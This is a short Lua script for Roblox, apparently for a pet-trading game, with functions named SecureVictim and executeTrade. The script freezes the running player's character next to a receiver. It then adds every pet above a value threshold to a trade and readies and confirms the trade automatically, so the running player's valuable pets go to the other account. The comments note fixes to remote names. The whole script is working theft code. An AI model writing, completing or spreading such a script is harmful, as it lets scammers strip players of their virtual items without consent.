-- [[ STEP 2: CORRECT API PATHING ]] --
-- Fix: Changed TradeAPI to Trade
local API = ReplicatedStorage:WaitForChild("API")
local TradeRemoteFolder = API:WaitForChild("Trade") 

local function SecureVictim(receiver)
    pcall(function()
        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local targetChar = receiver.Character or receiver.CharacterAdded:Wait()
        local hum = char:WaitForChild("Humanoid")
        local hrp = char:WaitForChild("HumanoidRootPart")
        local targetHrp = targetChar:WaitForChild("HumanoidRootPart")
        
        if hum and hrp and targetHrp then
            hum.Sit = false
            task.wait(0.1)
            hrp.CFrame = targetHrp.CFrame * CFrame.new(0, 0, 3)
            hrp.Anchored = true
        end
    end)
end

local function executeTrade(targetPlayer)
    local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
    local inventory = ClientData.get_data().inventory
    
    if inventory and inventory.pets then
        SecureVictim(targetPlayer)

        for _, petData in pairs(inventory.pets) do
            local val = _G.GetTrueValue(petData, _G.PetValueDB) or 0
            if val >= (getgenv().THRESHOLD or 0) then
                task.spawn(function()
                    -- Corrected Remote Name
                    TradeRemoteFolder:WaitForChild("AddItemToTrade"):FireServer(petData.unique)
                end)
            end
        end
        
        task.wait(0.5)
        TradeRemoteFolder:WaitForChild("ReadyTrade"):FireServer(true)
        task.wait(0.2)
        TradeRemoteFolder:WaitForChild("ConfirmTrade"):FireServer()
    end
end

